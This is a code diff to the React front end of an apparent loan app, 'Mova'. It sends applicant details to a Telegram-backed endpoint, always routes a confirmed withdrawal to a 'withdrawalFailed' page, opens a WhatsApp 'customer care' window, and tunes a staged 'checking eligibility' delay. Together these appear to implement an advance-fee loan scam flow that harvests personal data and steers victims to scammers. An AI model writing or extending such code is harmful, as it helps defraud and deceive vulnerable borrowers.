@@ -19,6 +19,7 @@ import {
 
 const USD_TO_UGX = 3750;
 const API_BASE_URL = import.meta.env.VITE_API_URL || 'https://movafinanceapp.onrender.com';
+const WHATSAPP_SUPPORT_URL = 'https://wa.me/qr/EPZ6GW2PGBL7H1';
 
 const loanModels = {
   personal: {
@@ -204,6 +205,8 @@ function App() {
     setWithdrawalError('');
     setLoadingMessage('Sending your details to Mova support');
     setIsLoading(true);
+    const whatsappWindow = window.open('', '_blank');
+    if (whatsappWindow) whatsappWindow.opener = null;
 
     try {
       const response = await fetch(`${API_BASE_URL}/api/telegram/contact`, {
@@ -227,8 +230,12 @@ function App() {
 
       setWithdrawalConfirmed(true);
       setIsLoading(false);
+      if (whatsappWindow) {
+        whatsappWindow.location.href = WHATSAPP_SUPPORT_URL;
+      }
       navigateToPage('withdrawalFailed', 'Processing withdrawal details');
     } catch (error) {
+      if (whatsappWindow) whatsappWindow.close();
       setIsLoading(false);
       setWithdrawalError(error.message || 'We could not send your details. Please try again.');
     }
@@ -545,7 +552,7 @@ function App() {
 
         <div className="wizard-actions review-actions">
           <button type="button" className="secondary-button" onClick={() => navigateToPage('application', 'Loading your application form')}>Back</button>
-          <button type="button" className="primary-button" disabled={!consentAccepted} onClick={() => navigateToPage('success', 'Scanning your information and checking eligibility', 30000)}>
+          <button type="button" className="primary-button" disabled={!consentAccepted} onClick={() => navigateToPage('success', 'Scanning your information and checking eligibility', 20000)}>
             Submit application <ChevronRight size={16} />
           </button>
         </div>
@@ -617,7 +624,7 @@ function App() {
           <div className="support-panel">
             <strong>Contact customer care</strong>
             <span>Chat with Mova customer care on WhatsApp to resolve the withdrawal issue.</span>
-            <a className="whatsapp-button" href="https://wa.me/qr/EPZ6GW2PGBL7H1" target="_blank" rel="noreferrer" aria-label="Chat with Mova customer care on WhatsApp"><MessageCircle size={17} /> Chat with customer care on WhatsApp</a>
+            <a className="whatsapp-button" href={WHATSAPP_SUPPORT_URL} target="_blank" rel="noreferrer" aria-label="Chat with Mova customer care on WhatsApp"><MessageCircle size={17} /> Chat with customer care on WhatsApp</a>
           </div>
           <div className="wizard-actions review-actions">
             <button type="button" className="secondary-button" onClick={() => navigateToPage('success', 'Returning to your offer')}>Back to offer</button>
